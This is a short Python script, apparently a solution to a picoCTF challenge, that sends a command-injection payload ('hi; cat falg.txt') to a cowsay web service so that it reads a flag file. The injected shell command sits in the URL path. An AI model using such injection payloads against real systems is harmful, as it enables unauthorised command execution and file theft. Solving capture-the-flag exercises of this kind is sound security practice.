import requests

url = "https://caas.mars.picoctf.net"

payload = "hi; cat falg.txt"

res = requests.get(f'{url}/cowsay/{payload}')

print(res.text)